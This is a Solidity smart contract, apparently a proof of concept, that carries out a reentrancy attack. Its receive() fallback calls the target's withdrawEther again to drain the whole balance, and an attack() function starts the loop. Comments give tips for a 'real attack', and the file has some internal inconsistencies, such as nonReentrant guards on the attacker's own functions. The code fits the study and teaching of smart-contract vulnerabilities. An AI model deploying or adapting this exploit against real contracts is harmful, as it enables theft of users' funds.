//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract ReentrancyAttack is ReentrancyGuard {
    address payable public targetContract;
    error DepositFailed();
    error AttackFailed();
    error RecursiveAttackFailed();

    // Set the target contract address
    constructor(address payable _targetContract) {
        targetContract = _targetContract;
    }

    function deposit(uint256 amount) external payable {
        // Deposit Ether into the target contract
        (bool success, ) = targetContract.call{value: amount}("");
        if (!success) revert DepositFailed();
    }

    // Fallback function to receive Ether
    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance > 0) {
            // Attempt to withdraw the remaining balance from the target contract
            (bool success, ) = targetContract.call{value: 0}(
                abi.encodeWithSignature("withdrawEther(uint256)", targetBalance)
            );
            // Note: In a real attack, you might choose a smaller amount to ensure
            // the call succeeds and doesn't run out of gas, depending on the target's logic.
            if (!success) revert RecursiveAttackFailed();
        }
    }

    function recursiveAttack(uint256 amount) external nonReentrant {
        /// Withdraw Ether from the target contract
        (bool success, ) = targetContract.call(
            abi.encodeWithSignature("withdrawEther(uint256)", amount)
        );
        if (!success) revert RecursiveAttackFailed();
    }

    // Attack function to initiate reentrancy
    function attack(uint256 _amount) external nonReentrant {
        // Ensure the contract has enough Ether to perform the attack
        require(
            address(this).balance >= _amount,
            "Insufficient balance for attack"
        );

        // Cast the target contract to an interface that includes the function to be reentranced
        (bool success, ) = targetContract.call{value: _amount}(
            abi.encodeWithSignature("withdrawEther(uint256)", _amount)
        );
        if (!success) revert AttackFailed();

        // Optionally, add logic here to repeat the attack or perform additional actions
    }

    // Function to withdraw Ether from this contract
    function withdraw() external nonReentrant {
        payable(msg.sender).transfer(address(this).balance);
    }
}
